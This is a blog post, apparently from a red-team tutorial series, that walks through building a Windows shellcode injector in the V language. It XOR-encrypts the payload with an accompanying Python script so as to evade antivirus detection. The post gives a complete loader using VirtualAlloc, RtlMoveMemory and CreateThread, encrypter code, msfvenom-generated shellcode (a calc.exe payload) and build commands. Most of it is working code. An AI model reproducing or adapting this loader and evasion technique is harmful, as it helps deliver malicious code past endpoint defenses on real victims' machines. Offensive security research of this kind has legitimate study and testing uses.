---
layout: single
title:  "OffensiVe Security with V 3 - XOR"
date:   2022-07-20 16:54:50 -0500
categories: red-team
tags: vlang windows
permalink: /:categories/:title/

header:
  overlay_image: /images/cloudflare1/banner.png
  overlay_filter: rgba(0, 0, 0, 0.7)
  actions:
     - label: "View Code"
       url: "https://github.com/alexfrancow/offensive-vlang"
  
---

In the previous part of this series of posts, the [injection process](https://alexfrancow.github.io/app-development/OffensiVe-Security-with-V-Shellcode-Execution/) of a **shellcode** in **V** was detailed, in this part another **injection technique** with **XOR encryption** will be investigated in order to mitigate **AV defenses**.

> Previous part in: https://alexfrancow.github.io/app-development/OffensiVe-Security-with-V-Shellcode-Execution/

## Process Injection with XOR encrypted payload

From a basic **shellcode** injection it is possible to **encrypt** the payload in order to make malware reversing difficult or even reduce the number of **AV** detections. An **XOR encryption** of the shellcode will be implemented.

To do this, the following code will be used, which shows a memory injection of a shellcode.

`4_XORShellcode.v`

```c
module main
import time

#flag -luser32
#flag -lkernel32

fn C.VirtualAlloc(voidptr, u32, u32, u32) voidptr
fn C.RtlMoveMemory(voidptr, voidptr, u32)
fn C.CreateThread(voidptr, u32, voidptr, voidptr, u32, &u32) voidptr

fn inject(shellcode []byte) bool {
    println('Creating virtualAlloc')
    address_pointer := C.VirtualAlloc(voidptr(0), usize(sizeof(shellcode)), 0x3000, 0x40)

    println('WriteProcessMemory')
    C.RtlMoveMemory(address_pointer, shellcode.data, shellcode.len)

    println('CreateRemoteThread')
    C.CreateThread(voidptr(0), u32(0), voidptr(address_pointer), voidptr(0), 0, &u32(0))
    time.sleep(1 * time.second)
    return true
}

fn main() {
    shellcode := []
    inject(shellcode)
}
```

>    time.sleep() is now more flexible and consistent, like in Go:
    time.sleep(10 * time.second) instead of time.sleep(10)
    time.sleep(10 * time.millisecond) instead of time.sleep_ms(10)


Encrypting the shellcode is useful for bypassing **AVs** or making reverse engineering difficult. In this case, it will be obtained by adding a **function** called **XOR** `fn xor` whose utility is to perform an **XOR decryption** with a **private key**. This is a **symmetric encryption**, so it is possible to use the same key for encryption and decryption.

```c
fn xor(shellcode []byte, key []byte) []byte {
    mut output := []byte{}
    for i := 0; i < shellcode.len; i++ {
        output << shellcode[i] ^ key[i % key.len]
    }
    return output
}

fn main() {
    key := "besecteam"
    EncryptedShellcode := [ byte(0xb8), 0xa8, 0xcd, ...]
    DecryptedShellcode := xor(EncryptedShellcode, key.bytes())
    inject(DecryptedShellcode)
}
```

After adding the function in the **V script**, it is necessary to encrypt a shellcode with the same private key. For this, the following script in **Python** will be developed.

`4_XORShellcode_cipher.py`

```python
import sys
import os
import hashlib
import string

## XOR function to encrypt data
def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        ordd = lambda x: x if isinstance(x, int) else ord(x)
        output_str += chr(ordd(current) ^ ord(current_key))
    return output_str

## encrypting
def xor_encrypt(data, key):
    ciphertext = xor(data, key)
    ciphertext = '[ byte(0x' + ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' ]'
    ciphertext = ciphertext[:11] + ')' + ciphertext[11:]
    print (ciphertext)
    return ciphertext, key

## key for encrypt/decrypt
key = "besecteam"

## payload calc.exe
plaintext = b'\xda\xcd\xbe\xa9\xf7\x04\x1e\xd9t$\xf4Z+\xc9\xb111r\x18\x83\xc2\x04\x03r\xbd\x15\xf1\xe2U[\xfa\x1a\xa5<r\xff\x94|\xe0\x8b\x86Lb\xd9*&&\xca\xb9J\xef\xfd\n\xe0\xc90\x8bY)R\x0f\xa0~\xb4.ks\xb5w\x96~\xe7 \xdc-\x18E\xa8\xed\x93\x15<vG\xed?W\xd6ffw\xd8\xab\x12>\xc2\xa8\x1f\x88y\x1a\xeb\x0b\xa8S\x14\xa7\x95\\\xe7\xb9\xd2Z\x18\xcc*\x99\xa5\xd7\xe8\xe0q]\xebB\xf1\xc5\xd7s\xd6\x90\x9c\x7f\x93\xd7\xfbc";p\x9f\xaf\xbaW\x16\xeb\x98ss\xaf\x81"\xd9\x1e\xbd5\x82\xff\x1b=.\xeb\x11\x1c$\xea\xa4\x1a\n\xec\xb6$:\x85\x87\xaf\xd5\xd2\x17z\x92-R\'\xb2\xa5;\xbd\x87\xab\xbbk\xcb\xd5?\x9e\xb3!_\xeb\xb6n\xe7\x07\xca\xff\x82\'y\xff\x86K\x1c\x93K\xa2\xbb\x13\xe9\xba'

ciphertext, p_key = xor_encrypt(plaintext, key)

# open and replace our payload in C++ code
tmp = open("./4_XORShellcode.v", "rt")
data = tmp.read()
data = data.replace('shellcode := []', 'shellcode := ' + ciphertext)
tmp.close()
tmp = open("./4_XORShellcode_mod.v", "w+")
tmp.write(data)
tmp.close()
```

The payload will be generated with **msfvenom** and added to the script.

```bash
msfvenom -a x86 -p windows/exec CMD=calc.exe -f c -b '\x00' \
  -f raw -o calc.bin && python3 \
  -c "plaintext = open('./calc.bin', 'rb').read();print(plaintext)" | \
  xclip
```

Once the **Python** script is executed, it will generate a file called `4_XORShellcode_mod.v`.

```bash
python3 4_XORShellcode_cipher.py
v 4_XORShellcode_mod.v
```

`4_XORShellcode_mod.v` will be compiled with **V** to generate the `4_XORShellcode_mod.exe` executable.

